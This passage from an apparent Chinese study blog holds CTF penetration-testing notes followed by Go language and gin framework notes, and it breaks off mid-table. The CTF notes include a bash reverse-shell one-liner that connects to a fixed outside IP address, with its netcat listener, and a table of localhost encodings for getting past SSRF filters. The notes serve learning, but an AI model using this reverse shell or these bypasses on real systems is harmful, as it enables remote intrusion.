<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c 从字符串中读入命令</span><br><span class="line">bash -i，意为创建一个交互式的bash shell</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1</span><br><span class="line">/dev/tcp/139.224.54.229/9090，这是一个特殊文件，它会建立一个连接到192.168.1.1:9090的socket</span><br><span class="line">bash -i创建一个交互式的bash，&amp;&gt;将bash的标准输出重定向到/dev/tcp/192.168.1.1/9090的socket连接上，</span><br><span class="line">0&gt;&amp;1将标准输入重定向到标准输出，最终的结果就是标准输入也被重定向到了TCP连接中，</span><br><span class="line">因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1     --模板反弹shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 9090   </span><br></pre></td></tr></table></figure>
<h2 id="7ip地址的各种形式"><a class="markdownIt-Anchor" href="#7ip地址的各种形式"></a> 7.ip地址的各种形式:</h2>
<table>
<thead>
<tr>
<th>类型</th>
<th>表示方法</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅ 标准十进制</td>
<td><code>a.b.c.d</code></td>
<td><code>127.0.0.1</code></td>
<td>最常见</td>
</tr>
<tr>
<td>✅ 十进制整数</td>
<td>单个十进制数</td>
<td><code>2130706433</code></td>
<td><code>127×256³ + 0×256² + 0×256 + 1</code></td>
</tr>
<tr>
<td>✅ 八进制</td>
<td><code>0177.0.0.01</code></td>
<td><code>0177.0.0.01</code></td>
<td>八进制：<code>0177=127</code>，<code>01=1</code></td>
</tr>
<tr>
<td>✅ 十六进制</td>
<td><code>0x7f.0x0.0x0.0x1</code></td>
<td><code>0x7f.0x0.0x0.0x1</code></td>
<td><code>0x7f=127</code>，支持绕过</td>
</tr>
<tr>
<td>✅ 整体十六进制</td>
<td><code>0x7f000001</code></td>
<td><code>127.0.0.1</code></td>
<td>一整个 IP 作为 hex</td>
</tr>
<tr>
<td>✅ 整体混合表示</td>
<td><code>127.1</code></td>
<td>等价 <code>127.0.0.1</code></td>
<td>后两段自动补全为0</td>
</tr>
<tr>
<td>✅ 域名解析</td>
<td><code>localhost</code></td>
<td><code>localhost</code></td>
<td>DNS解析成127.0.0.1</td>
</tr>
<tr>
<td>✅ DNS跳转</td>
<td><code>evil.ceye.io</code></td>
<td>解析为内网 IP</td>
<td>配合 DNS rebinding</td>
</tr>
<tr>
<td>✅ 数组式分段</td>
<td><code>127.0.1</code></td>
<td>= <code>127.0.0.1</code></td>
<td>缺省补0，浏览器兼容</td>
</tr>
<tr>
<td>✅ 十六进制分段混用</td>
<td><code>0x7f.1</code></td>
<td><code>127.0.0.1</code></td>
<td>分段可混合进制</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>表达形式</th>
<th>对应 IP</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>127.0.0.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>127.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0x7f.0.0.1</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0x7f000001</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>0177.0.0.01</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>2130706433</code></td>
<td>127.0.0.1</td>
</tr>
<tr>
<td><code>[::1]</code></td>
<td>127.0.0.1 (IPv6 回环)</td>
</tr>
</tbody>
</table>
<p>还有个0.0.0.0或者0(linxu)</p>
<h2 id="8nginx"><a class="markdownIt-Anchor" href="#8nginx"></a> 8.nginx:</h2>
<table>
<thead>
<tr>
<th>日志类型</th>
<th>默认路径</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>访问日志</strong></td>
<td><code>/var/log/nginx/access.log</code></td>
</tr>
<tr>
<td><strong>错误日志</strong></td>
<td><code>/var/log/nginx/error.log</code></td>
</tr>
</tbody>
</table>
<h2 id="9curl的使用"><a class="markdownIt-Anchor" href="#9curl的使用"></a> 9.curl的使用:</h2>
<h3 id="1下载文件"><a class="markdownIt-Anchor" href="#1下载文件"></a> 1.下载文件:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o filename URL</span><br><span class="line">-O URL</span><br><span class="line"></span><br><span class="line">断点续传 / 大文件下载:</span><br><span class="line">     curl -C - -O URL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2代理"><a class="markdownIt-Anchor" href="#2代理"></a> 2.代理:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-x socks5://127.0.0.1:7890</span><br><span class="line">--proxy http://127.0.0.1:7890</span><br><span class="line">尽量加上 -L 跟随重定向</span><br></pre></td></tr></table></figure>
<h3 id="3更改请求方式"><a class="markdownIt-Anchor" href="#3更改请求方式"></a> 3.更改请求方式:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X GET URL</span><br><span class="line">curl -X POST -d &quot;key=value&amp;foo=bar&quot; URL</span><br><span class="line">curl -X PUT -d &#x27;&#123;&quot;name&quot;:&quot;wanyan&quot;&#125;&#x27; -H &quot;Content-Type: application/json&quot; URL</span><br></pre></td></tr></table></figure>
<h3 id="4详细调试"><a class="markdownIt-Anchor" href="#4详细调试"></a> 4.详细调试:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v URL       # 显示请求/响应详情</span><br><span class="line">curl -vvv URL     # 更详细</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>各种包</title>
    <url>/2025/10/12/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%90%84%E7%A7%8D%E5%8C%85/</url>
    <content><![CDATA[<h2 id="1os包"><a class="markdownIt-Anchor" href="#1os包"></a> 1.os包:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>os.Create(name string)</code></td>
<td>创建一个新文件，如果文件已存在则覆盖。</td>
</tr>
<tr>
<td><code>os.Open(name string)</code></td>
<td>打开指定的文件。</td>
</tr>
<tr>
<td><code>os.Remove(name string)</code></td>
<td>删除指定文件。</td>
</tr>
<tr>
<td><code>os.Rename(oldpath, newpath string)</code></td>
<td>重命名文件或目录。</td>
</tr>
<tr>
<td><code>os.Mkdir(name string, perm os.FileMode)</code></td>
<td>创建一个目录。</td>
</tr>
<tr>
<td><code>os.MkdirAll(path string, perm os.FileMode)</code></td>
<td>递归创建目录。</td>
</tr>
<tr>
<td><code>os.Getenv(key string)</code></td>
<td>获取环境变量的值。</td>
</tr>
<tr>
<td><code>os.Setenv(key, value string)</code></td>
<td>设置环境变量的值。</td>
</tr>
<tr>
<td><code>os.Unsetenv(key string)</code></td>
<td>删除环境变量。</td>
</tr>
<tr>
<td><code>os.Exit(code int)</code></td>
<td>退出当前程序，返回指定的退出码。</td>
</tr>
<tr>
<td><code>os.Getpid()</code></td>
<td>获取当前进程的PID。</td>
</tr>
<tr>
<td><code>os.Getppid()</code></td>
<td>获取当前进程的父进程PID。</td>
</tr>
<tr>
<td><code>os.Stat(name string)</code></td>
<td>获取文件的基本信息（如大小、权限、修改时间等）。</td>
</tr>
<tr>
<td><code>os.Lstat(name string)</code></td>
<td>获取文件的状态信息，不会追踪符号链接。</td>
</tr>
<tr>
<td><code>os.Getwd()</code></td>
<td>获取当前工作目录。</td>
</tr>
<tr>
<td><code>os.Chdir(dir string)</code></td>
<td>改变当前工作目录。</td>
</tr>
<tr>
<td><code>os.Args</code></td>
<td>包含命令行参数的切片。</td>
</tr>
<tr>
<td><code>os.TempDir()</code></td>
<td>返回系统默认的临时文件目录。</td>
</tr>
</tbody>
</table>
<h3 id="1osargs"><a class="markdownIt-Anchor" href="#1osargs"></a> 1.os.Args:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os.Args[<span class="number">0</span>] 是程序路径   --会输出类似/tmp/go-build2554150706/b001/exe/main的东西</span><br><span class="line">         ---要得到命令行参数必须从[<span class="number">1</span>]开始</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
<h2 id="2bufio包"><a class="markdownIt-Anchor" href="#2bufio包"></a> 2.bufio包:</h2>
<table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>bufio.NewReader(r io.Reader)</code></td>
<td>创建一个新的缓冲读取器，可以提高读取效率。</td>
</tr>
<tr>
<td><code>bufio.NewWriter(w io.Writer)</code></td>
<td>创建一个新的缓冲写入器，可以提高写入效率。</td>
</tr>
<tr>
<td><code>bufio.NewScanner(r io.Reader)</code></td>
<td>创建一个新的扫描器，可以按行读取输入并处理数据。</td>
</tr>
<tr>
<td><code>bufio.Reader.ReadLine()</code></td>
<td>从缓冲区读取一行数据（返回一行字符和布尔值，指示是否结束）。</td>
</tr>
<tr>
<td><code>bufio.Writer.Write(p []byte)</code></td>
<td>向缓冲区写入数据，直到缓冲区满或调用 <code>Flush()</code>。</td>
</tr>
<tr>
<td><code>bufio.Reader.ReadString(delim byte)</code></td>
<td>从缓冲区读取直到指定分隔符的内容。</td>
</tr>
<tr>
<td><code>bufio.Writer.Flush()</code></td>
<td>将缓冲区中的数据刷新到底层 Writer 中。</td>
</tr>
</tbody>
</table>
<h2 id="3reflect包"><a class="markdownIt-Anchor" href="#3reflect包"></a> 3.reflect包:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go 的 reflect 包是 Go 语言中的反射机制实现，主要用于在运行时检查类型（<span class="keyword">type</span>）和变量的值（value）。使用 reflect，你可以动态地获取变量的类型、值，也可以动态设置它的值。</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>项目</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>包导入</td>
<td><code>import &quot;reflect&quot;</code></td>
</tr>
<tr>
<td>获取类型信息</td>
<td><code>reflect.TypeOf(x)</code> 返回 <code>reflect.Type</code> 对象</td>
</tr>
<tr>
<td>获取值信息</td>
<td><code>reflect.ValueOf(x)</code> 返回 <code>reflect.Value</code> 对象</td>
</tr>
<tr>
<td>获取/调用方法名</td>
<td><code>reflect.TypeOf(x).Method(i)</code> 逐个获取类型方法</td>
</tr>
<tr>
<td>修改变量值</td>
<td><code>reflect.ValueOf(x).Elem().Set()</code> 必须传入可寻址的指针</td>
</tr>
<tr>
<td>判断类型或种类</td>
<td><code>t.Kind()</code> 获取具体类型种类（如 Struct、Ptr、Slice 等）</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>功能</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>reflect.TypeOf()</code></td>
<td>获取变量的类型信息</td>
</tr>
<tr>
<td><code>reflect.ValueOf()</code></td>
<td>获取变量的值信息，可以通过 <code>.Interface()</code> 转成原始类型</td>
</tr>
<tr>
<td>修改结构体字段</td>
<td>必须使用指针，并通过 <code>Elem()</code> 获取可设置值</td>
</tr>
<tr>
<td>判断类型</td>
<td>用 <code>Kind()</code> 判断是否是 struct、int、slice 等基础种类</td>
</tr>
</tbody>
</table>
<h2 id="4fmt库"><a class="markdownIt-Anchor" href="#4fmt库"></a> 4.fmt库:</h2>
<table>
<thead>
<tr>
<th>分类</th>
<th>函数/方法</th>
<th>用途描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>标准输出</td>
<td><code>Print</code></td>
<td>打印输出，不带换行</td>
</tr>
<tr>
<td></td>
<td><code>Println</code></td>
<td>打印输出，自动换行</td>
</tr>
<tr>
<td></td>
<td><code>Printf</code></td>
<td>按格式输出（格式化字符串）</td>
</tr>
<tr>
<td>字符串输出</td>
<td><code>Sprintf</code></td>
<td>将格式化内容返回为字符串</td>
</tr>
<tr>
<td></td>
<td><code>Sprint</code></td>
<td>类似 <code>Print</code>，但返回字符串</td>
</tr>
<tr>
<td></td>
<td><code>Sprintln</code></td>
<td>类似 <code>Println</code>，但返回字符串</td>
</tr>
<tr>
<td>错误输出</td>
<td><code>Fprint</code></td>
<td>将内容写入 <code>io.Writer</code>（如 <code>os.Stderr</code>）</td>
</tr>
<tr>
<td></td>
<td><code>Fprintf</code></td>
<td>同上，格式化输出</td>
</tr>
<tr>
<td></td>
<td><code>Fprintln</code></td>
<td>同上，自动换行</td>
</tr>
<tr>
<td>格式输入</td>
<td><code>Scan</code></td>
<td>从标准输入读取</td>
</tr>
<tr>
<td></td>
<td><code>Scanf</code></td>
<td>从标准输入按格式读取</td>
</tr>
<tr>
<td></td>
<td><code>Scanln</code></td>
<td>从标准输入读取一行</td>
</tr>
<tr>
<td></td>
<td><code>Sscan</code></td>
<td>从字符串中读取数据</td>
</tr>
<tr>
<td></td>
<td><code>Sscanf</code></td>
<td>从字符串中按格式读取</td>
</tr>
<tr>
<td></td>
<td><code>Sscanln</code></td>
<td>从字符串中读取一行</td>
</tr>
<tr>
<td>格式控制</td>
<td><code>%v</code></td>
<td>默认格式（常用）</td>
</tr>
<tr>
<td></td>
<td><code>%#v</code></td>
<td>Go 语法格式输出</td>
</tr>
<tr>
<td></td>
<td><code>%T</code></td>
<td>输出值的类型</td>
</tr>
<tr>
<td></td>
<td><code>%+v</code></td>
<td>输出字段名和值（结构体）</td>
</tr>
<tr>
<td></td>
<td><code>%q</code></td>
<td>字符串加引号输出</td>
</tr>
<tr>
<td></td>
<td><code>%t</code></td>
<td>布尔值</td>
</tr>
<tr>
<td></td>
<td><code>%d</code> <code>%x</code> <code>%b</code></td>
<td>十进制、十六进制、二进制整数</td>
</tr>
<tr>
<td></td>
<td><code>%f</code> <code>%e</code> <code>%g</code></td>
<td>浮点数格式</td>
</tr>
</tbody>
</table>
<h3 id="1fprint类型配合os库"><a class="markdownIt-Anchor" href="#1fprint类型配合os库"></a> 1.Fprint:类型(配合os库)</h3>
<table>
<thead>
<tr>
<th>函数名</th>
<th>是否格式化</th>
<th>是否自动换行</th>
<th>输出目标类型</th>
<th>常见用途说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Fprint</code></td>
<td>❌</td>
<td>❌</td>
<td><code>io.Writer</code> 接口</td>
<td>普通输出内容，不换行</td>
</tr>
<tr>
<td><code>Fprintln</code></td>
<td>❌</td>
<td>✅</td>
<td><code>io.Writer</code> 接口</td>
<td>输出内容自动换行</td>
</tr>
<tr>
<td><code>Fprintf</code></td>
<td>✅</td>
<td>❌</td>
<td><code>io.Writer</code> 接口</td>
<td>带格式化输出</td>
</tr>
</tbody>
</table>
<h3 id="2scan类型"><a class="markdownIt-Anchor" href="#2scan类型"></a> 2.scan类型:</h3>
<table>
<thead>
<tr>
<th>函数名</th>
<th>输入源</th>
<th>是否格式化</th>
<th>是否遇空格结束</th>
<th>是否支持换行</th>
<th>常见用途说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Scan</code></td>
<td>标准输入</td>
<td>❌</td>
<td>✅</td>
<td>✅</td>
<td>逐个读取，空格/换行分隔</td>
</tr>
<tr>
<td><code>Scanf</code></td>
<td>标准输入</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
<td>指定格式读取，如 <code>%d %s</code></td>
</tr>
<tr>
<td><code>Scanln</code></td>
<td>标准输入</td>
<td>❌</td>
<td>✅</td>
<td>❌</td>
<td>读取一整行，读取完立即结束</td>
</tr>
<tr>
<td><code>Sscan</code></td>
<td>字符串</td>
<td>❌</td>
<td>✅</td>
<td>✅</td>
<td>从字符串中读取</td>
</tr>
<tr>
<td><code>Sscanf</code></td>
<td>字符串</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
<td>格式化字符串读取</td>
</tr>
<tr>
<td><code>Sscanln</code></td>
<td>字符串</td>
<td>❌</td>
<td>✅</td>
<td>❌</td>
<td>类似 <code>Scanln</code>，但输入是字符串</td>
</tr>
</tbody>
</table>
<h3 id="3sscan类型"><a class="markdownIt-Anchor" href="#3sscan类型"></a> 3.Sscan类型:</h3>
<table>
<thead>
<tr>
<th>函数名</th>
<th>输入源</th>
<th>是否格式化</th>
<th>是否自动换行结束</th>
<th>调用方式</th>
<th>功能说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Sscan</code></td>
<td>字符串</td>
<td>❌</td>
<td>✅（遇空格或换行）</td>
<td><code>fmt.Sscan(str, &amp;a, &amp;b)</code></td>
<td>从字符串中提取多个值，空格分隔</td>
</tr>
<tr>
<td><code>Sscanf</code></td>
<td>字符串</td>
<td>✅</td>
<td>✅（按格式匹配）</td>
<td><code>fmt.Sscanf(str, &quot;age=%d&quot;, &amp;a)</code></td>
<td>✅ 按格式提取，适用于结构化数据解析</td>
</tr>
<tr>
<td><code>Sscanln</code></td>
<td>字符串</td>
<td>❌</td>
<td>❌（一行内有效）</td>
<td><code>fmt.Sscanln(str, &amp;a, &amp;b)</code></td>
<td>类似 <code>Sscan</code>，但严格一行，结尾不能多余</td>
</tr>
</tbody>
</table>
<h2 id="5gin库的实现后端微服务"><a class="markdownIt-Anchor" href="#5gin库的实现后端微服务"></a> 5.gin库的实现(后端微服务):</h2>
<h3 id="1基础实现"><a class="markdownIt-Anchor" href="#1基础实现"></a> 1.基础实现;</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 1.创建路由</span></span><br><span class="line">   r := gin.Default()</span><br><span class="line">   <span class="comment">// 2.绑定路由规则，执行的函数</span></span><br><span class="line">   <span class="comment">// gin.Context，封装了request和response</span></span><br><span class="line">   r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">      c.String(http.StatusOK, <span class="string">&quot;hello World!&quot;</span>)</span><br><span class="line">   &#125;)</span><br><span class="line">   <span class="comment">// 3.监听端口，默认在8080</span></span><br><span class="line">   <span class="comment">// Run(&quot;里面不指定端口号默认为8080&quot;) </span></span><br><span class="line">   r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2路由"><a class="markdownIt-Anchor" href="#2路由"></a> 2.路由:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">路由是由r.Get(<span class="string">&quot;/&quot;</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>&#123;&#125;)     ---第一个参数是：路径； 第二个参数是：具体操作 <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span></span><br></pre></td></tr></table></figure>
<h4 id="1路由分组"><a class="markdownIt-Anchor" href="#1路由分组"></a> 1.路由分组 ：</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个路由组，都可以访问，大括号是为了保证规范</span></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 通过 localhost:8080/v1/hello访问，以此类推</span></span><br><span class="line">    v1.GET(<span class="string">&quot;/hello&quot;</span>, sayHello)</span><br><span class="line">    v1.GET(<span class="string">&quot;/world&quot;</span>, sayWorld)</span><br><span class="line">&#125;</span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    v2.GET(<span class="string">&quot;/hello&quot;</span>, sayHello)</span><br><span class="line">    v2.GET(<span class="string">&quot;/world&quot;</span>, sayWorld)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="2大量路由实现"><a class="markdownIt-Anchor" href="#2大量路由实现"></a> 2.大量路由实现:</h5>
<p>把 Gin 的路由注册逻辑 <strong>按模块拆分到多个 Go 文件中（通常放在 <code>routers</code> 包下）</strong>，每个文件只负责注册某一类路由，比如用户模块、文章模块等，最后 <code>main.go</code> 统一调用这些注册函数，实现整体路由注册。</p>
<table>
<thead>
<tr>
<th>文件/目录</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>main.go</code></td>
<td>主函数，创建 <code>engine</code> 并调用多个注册函数</td>
</tr>
<tr>
<td><code>routers/</code></td>
<td>路由模块目录</td>
</tr>
<tr>
<td><code>routers/user.go</code></td>
<td>用户相关路由注册方法（如 <code>/user/login</code>）</td>
</tr>
<tr>
<td><code>routers/article.go</code></td>
<td>文章相关路由注册方法（如 <code>/article/list</code>）</td>
</tr>
</tbody>
</table>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">go_project/</span><br><span class="line">├── main.<span class="keyword">go</span></span><br><span class="line">└── routers/</span><br><span class="line">    ├── user.<span class="keyword">go</span></span><br><span class="line">    └── article.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">routers/user.<span class="keyword">go</span>的实现</span><br><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterUserRoutes</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line">	userGroup := r.Group(<span class="string">&quot;/user&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		userGroup.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.String(http.StatusOK, <span class="string">&quot;用户登录&quot;</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">		userGroup.GET(<span class="string">&quot;/info&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.String(http.StatusOK, <span class="string">&quot;用户信息&quot;</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">最后在main函数中:</span><br><span class="line">routers.RegisterUserRoutes(r)   ---就可以直接注册这个路由分组</span><br></pre></td></tr></table></figure>
<h3 id="3获取参数"><a class="markdownIt-Anchor" href="#3获取参数"></a> 3.获取参数：</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">: 只能匹配<span class="number">1</span>个，* 可以匹配任意个数</span><br></pre></td></tr></table></figure>
<h4 id="1路径参数"><a class="markdownIt-Anchor" href="#1路径参数"></a> 1.路径参数:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/user/:name/*action&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    name := c.Param(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    action := c.Param(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">    <span class="comment">//截取/</span></span><br><span class="line">    action = strings.Trim(action, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    c.String(http.StatusOK, name+<span class="string">&quot; is &quot;</span>+action)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="2url参数get"><a class="markdownIt-Anchor" href="#2url参数get"></a> 2.URL参数(get):</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">URL参数可以通过DefaultQuery()或Query()方法获取</span><br><span class="line">DefaultQuery()若参数不存在则，返回默认值，Query()若不存在，返回空串</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/user&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//指定默认值</span></span><br><span class="line">    name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;normal&quot;</span>)</span><br><span class="line">    <span class="comment">//获取具体值</span></span><br><span class="line">    age := c.Query(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">    c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;hello %s, your age is %s&quot;</span>, name, age))</span><br><span class="line">&#125;)      ---如果没有name参数则会name的值为normal</span><br></pre></td></tr></table></figure>
<h4 id="3post参数"><a class="markdownIt-Anchor" href="#3post参数"></a> 3.POST参数:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">与get类似,可以通过DefaultPostForm()或者PostForm()方法获取</span><br></pre></td></tr></table></figure>
<h4 id="4文件获取"><a class="markdownIt-Anchor" href="#4文件获取"></a> 4.文件获取:</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">单文件获取:</span><br><span class="line">    r.MaxMultipartMemory = <span class="number">8</span> &lt;&lt; <span class="number">20</span>   -<span class="number">-8</span>mib  限制上传最大尺寸</span><br><span class="line">    file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)    ---得到文件</span><br><span class="line">    c.SaveUploadedFile(file, <span class="string">&quot;C:/desktop/&quot;</span>+file.Filename)   ---上传到指定路径</span><br><span class="line">多文件获取:</span><br><span class="line">    form, err := c.MultipartForm()  ---解析后的多部分表单数据</span><br><span class="line">    files := form.File[<span class="string">&quot;files&quot;</span>]     ---得到所有文件</span><br><span class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;    ---_这个位置是索引</span><br><span class="line">        <span class="comment">// 逐个存</span></span><br><span class="line">        fmt.Println(file.Filename)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="5获取请求参数"><a class="markdownIt-Anchor" href="#5获取请求参数"></a> 5.获取请求参数:</h4>
<table>
<thead>
<tr>
<th>功能</th>
<th>示例用法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>获取请求方法</td>
<td><code>c.Request.Method</code></td>
<td>“GET”, “POST”, etc.</td>
</tr>
<tr>
<td>获取完整 URL</td>
<td><code>c.Request.URL.String()</code></td>
<td>请求的完整路径和参数</td>
</tr>
<tr>
<td>获取 URL 路径</td>
<td><code>c.Request.URL.Path</code></td>
<td>例如 <code>/login</code></td>
</tr>
<tr>
<td>获取查询参数（原始）</td>
<td><code>c.Request.URL.Query().Get(&quot;name&quot;)</code></td>
<td>等价于 <code>c.Query(&quot;name&quot;)</code></td>
</tr>
<tr>
<td>获取请求头</td>
<td><code>c.Request.Header.Get(&quot;User-Agent&quot;)</code></td>
<td>获取请求头字段</td>
</tr>
<tr>
<td>获取请求体（如 JSON）</td>
<td><code>c.Request.Body</code></td>
<td>需手动读取和解析</td>
</tr>
<tr>
<td>判断是否为 multipart</td>
<td><code>c.Request.MultipartForm != nil</code></td>
<td>文件上传场景常见</td>
</tr>
<tr>
<td>获取表单字段（POST）</td>
<td><code>c.Request.FormValue(&quot;username&quot;)</code></td>
<td>POST 表单字段</td>
</tr>
<tr>
<td>获取客户端 IP</td>
<td><code>c.Request.RemoteAddr</code></td>
<td>可能为 IP:PORT 格式</td>
</tr>
</tbody>
</table>
<h3 id="4返回值"><a class="markdownIt-Anchor" href="#4返回值"></a> 4.返回值:</h3>
<table>
<thead>
<tr>
<th>方法名</th>
<th>用途</th>
<th>返回格式</th>
<th>常用场景</th>
<th>参数说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>c.String()</code></td>
<td>返回字符串</td>
<td><code>text/plain</code></td>
<td>普通文本返回、调试信息</td>
<td><code>(statusCode int, format string, values ...interface&#123;&#125;)</code></td>
</tr>
<tr>
<td><code>c.JSON()</code></td>
<td>返回 JSON 数据</td>
<td><code>application/json</code></td>
<td>API 接口、前后端交互</td>
<td><code>(statusCode int, obj interface&#123;&#125;)</code>，通常配合 <code>gin.H</code> 使用</td>
</tr>
<tr>
<td><code>c.HTML()</code></td>
<td>返回 HTML 页面</td>
<td><code>text/html</code></td>
<td>网页模板渲染</td>
<td><code>(statusCode int, name string, obj interface&#123;&#125;)</code>，需使用模板引擎</td>
</tr>
<tr>
<td><code>c.Data()</code></td>
<td>返回任意数据</td>
<td>任意 MIME 类型</td>
<td>返回图片、音频、二进制等</td>
<td><code>(statusCode int, contentType string, data []byte)</code></td>
</tr>
<tr>
<td><code>c.XML()</code></td>
<td>返回 XML 数据</td>
<td><code>application/xml</code></td>
<td>XML 接口（少见）</td>
<td><code>(statusCode int, obj interface&#123;&#125;)</code></td>
</tr>
<tr>
<td><code>c.Redirect()</code></td>
<td>重定向</td>
<td>HTTP 3xx</td>
<td>页面跳转</td>
<td><code>(statusCode int, location string)</code></td>
</tr>
<tr>
<td><code>c.File()</code></td>
<td>返回本地文件</td>
<td>自动识别类型</td>
<td>文件下载</td>
<td><code>(filepath string)</code></td>
</tr>
<tr>
<td><code>c.AbortWithStatus()</code></td>
<td>中断请求，仅返回状态码</td>
<td>无正文</td>
<td>拦截非法请求</td>
<td><code>(statusCode int)</code></td>
</tr>
</tbody>
</table>
<h3 id="5模型绑定"><a class="markdownIt-Anchor" href="#5模型绑定"></a> 5.模型绑定:</h3>
<table>
<thead>
<tr>
<th>数据来源</th>
<th>使用方法</th>
<th>示例请求方式</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Query</code> 参数</td>
<td><code>ShouldBindQuery()</code></td>
<td><code>/search?name=Tom</code></td>
</tr>
<tr>
